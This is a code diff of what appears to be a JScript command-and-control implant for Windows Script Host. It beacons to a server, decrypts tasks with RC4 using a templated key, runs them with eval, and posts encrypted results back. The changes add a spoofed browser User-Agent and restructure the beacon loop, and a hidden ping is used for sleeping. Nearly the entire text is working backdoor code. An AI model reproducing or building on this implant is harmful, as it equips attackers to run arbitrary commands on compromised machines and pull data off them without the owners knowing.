@@ -1,4 +1,4 @@
-rc4 = function (key, str) {
+encrypt = function (key, str) {
 	var s = [], j = 0, x, res = '';
 	for (var i = 0; i < 256; i++) {
 		s[i] = i;
@@ -39,7 +39,8 @@ Post = function (context, session) {
 		if (session.length > 0) {
 			w.SetRequestHeader("Cookie", "session=" + session)
 		}
-		w.SetRequestHeader("Content-Type", "text/html; Charset=UTF-8");//"text/html; Charset=ISO-8859-1");
+		w.SetRequestHeader("Content-Type", "text/html; Charset=UTF-8");
+		w.SetRequestHeader("User-Agent", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
 		w.Send(context);
 		return [w.ResponseText, Cookie(w)];
 	} catch (e1) {
@@ -56,7 +57,7 @@ Sleep = function (n) {
 		s = new ActiveXObject("WScript.Shell").run("ping -n 2 127" + ".0.0.1", 0, true);
 	}
 }
-function b64enc(ResponseText) {
+b64enc = function (ResponseText) {
 	xml_dom = new ActiveXObject("MSXML2.DOMDocument");
 	ado_stream = new ActiveXObject("ADODB.Stream");
 	tmpNode = xml_dom.createElement("tmpNode");
@@ -77,21 +78,30 @@ function b64enc(ResponseText) {
 	else return tmp_retcode;
 
 }
-r = ["", []];
-session = "";
-SleepTime = parseInt("~SLEEP~");
-while (true) {
-	c = "[no output]";
-	if (r[1].length == 2 && r[1][0] == "session") session = r[1][1];
-	if (r[0].length > 0) {
-		d = rc4("~KEY~", r[0]);
-		try {
-			eval(d);
-		} catch (e1) { }
-		r = Post(b64enc(rc4("~KEY~", c)), session);
+run = function () {
+	r = ["", []];
+	session = "";
+	SleepTime = parseInt("~SLEEP~");
+	while (true) {
+		c = "";
+		//update session
+		if (r[1].length == 2 && r[1][0] == "session") session = r[1][1];
+		//do task
+		if (r[0].length > 0) {
+			// decrypt reponse
+			d = encrypt("~KEY~", r[0]);
+			WScript.Echo(d);
+			// eval task script
+			try {
+				eval(d);
+			} catch (e1) { }
+			// send result
+			r = Post(b64enc(encrypt("~KEY~", c)), session);
+		}
+		else {
+			r = Post(c, session);
+		}
+		Sleep(Random(SleepTime));
 	}
-	else {
-		r = Post("", session);
-	}
-	Sleep(Random(SleepTime));
 }
+run();
